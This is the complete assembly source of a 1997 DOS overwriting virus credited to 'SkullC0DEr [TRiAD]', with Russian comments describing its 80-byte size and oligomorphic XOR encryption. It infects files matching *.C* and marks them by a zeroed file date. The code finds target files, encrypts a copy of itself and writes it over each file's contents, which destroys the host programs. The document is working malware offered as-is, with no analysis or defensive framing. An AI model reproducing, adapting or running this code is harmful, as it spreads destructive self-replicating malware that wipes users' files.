                ;       [S]1997 SkullC0DEr [TRiAD]
                ;
                ;       Самый маленький (я надеюсь) олигоморфный оверрайтер
                ;       с проверкой на заражение.
                ;       Размер: 80 байт
                ;       Инфицирование: *.C*
                ;       Индикатор зараженности: нулевая дата файла
                ;       Стабильность: зависит от состояния регистров при запуске
                ;       Требования к CPU: 8086
                ;       Замечания: может не пойти под некоторыми версиями дос

CSEG		SEGMENT
                ORG     100H
                ASSUME  CS:CSEG,DS:CSEG
START:
                XOR     BYTE PTR DS:[SI+OFFSET VIR_BODY-100H],0
		INC	SI
                LOOP    START
VIR_BODY:
		MOV	AH,4EH
		MOV	DX,OFFSET FILESPEC
NEXT_SEARCH:
		INT	21H
		JC	EX_VIRUS
		CMP	AL,BYTE PTR DS:TIME_DTA
		MOV	AH,4FH
		JZ	NEXT_SEARCH
		XCHG	SI,CX
		MOV	DI,200H
                INC     BYTE PTR START+4
		REP	MOVSB
		MOV	SI,OFFSET VIR_BODY+200H
		MOV	CX,SI
                MOV     AL,BYTE PTR START+4
ENCODE_1:
		XOR	BYTE PTR DS:[SI],AL
		INC	SI
		LOOP	ENCODE_1
END_ENCODE_1:
		MOV	DX,FILE_DTA
		MOV	AX,3D02H
		INT	21H
		MOV	BH,40H
		XCHG	AX,BX
		MOV	DX,300H
		MOV	CL,VIR_LENGTH
		INT	21H
		MOV	AX,5701H
		XOR	CX,CX
		INT	21H
EX_VIRUS:
		RETN
FILESPEC	DB	'*.C*',0
VIR_LENGTH      EQU     $-OFFSET START
DTA		EQU	80H
TIME_DTA	EQU	DTA+16H
FILE_DTA	EQU	DTA+1EH
CSEG		ENDS
		END	START
